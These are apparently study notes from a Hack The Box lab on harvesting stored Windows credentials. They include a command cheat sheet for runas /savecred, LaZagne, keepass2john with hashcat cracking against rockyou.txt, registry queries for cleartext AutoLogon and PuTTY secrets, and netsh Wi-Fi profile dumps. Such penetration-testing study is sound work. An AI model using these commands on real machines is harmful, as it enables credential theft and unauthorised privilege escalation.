...
With saved credentials, **CMDKey** is used to save, create, list and delete stored users and passwords for things like RDP without needing to login. 

Web based credentials (like chrome) are often stored inside the application and can use tools like sharpchrome to retrieve the cookies and the saved logins

Password managers. Usually these are very important vaults to fine as they can easily lead me to administrator or escalate my privileges, keepass2john is a very useful case

Lazagne. its a tool that attempts to retrieve credentials from a wide variety of software including, web browsers, chat clients, databases, email, memory dumps and various sysadmin tools and any internal password machanisms like DPAPI.  

SessionGopher, it extracts PuTTY, WinSCP, FileZilla, SuperPuTTY & RDPCredentials. its written in powesrhell and searches for and decrypting saved login information, can be run locally and remotely!. it searches the HKEY_USERS hive for all users who have logged into a domain joined (or standalone) host then uses that to find and decrypt saved session information it can find.

Windows AutoLogon, its in the name, its a feature that allows a user to configure their windows OS to auto logon to a specific users account. once this is configured the creds are stored in registry in clear text under HKEY_LOCAL_MACHINE once queries these are going to be the registry keys under it
...
// we can run commands as another user
runas /savecred /user:inlanereight\bob "Command Here"

// Or we could use RunAsCs.exe / RunAsCs.ps1
...
// ---------------- Password Managers ---------------- //
// In this Case its keeppass
python keepass2john.py ILFREIGHT_Help_Desk.kdbx

// Cracking the hashes offline
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

// ---------------- More Credentials ---------------- //
// Using lazagne, collects creds from browsers, chat clients, databases, email, memory dumps, etc.
.\Lazagne.exe all
...
// ---------------- Cleartext passwords in the registry  ---------------- //

// Windows AutoLogon registry location
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon <---- is the usual location of where the autologon can be found

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"


// ---------------- Manually finding PuTTY  ---------------- //
// Manually looking for and finding credentials 
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

// Now we look into the keys of that specific PuTTY session
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh


// ---------------- Wifi Password ---------------- //
// Enumerating the saved credentials and profiles
netsh wlan show profile

// Now we retrieve the credentials from specific profiles
...
```shell-session
Hillside_1@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
...
```shell-session
Hillside_1@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
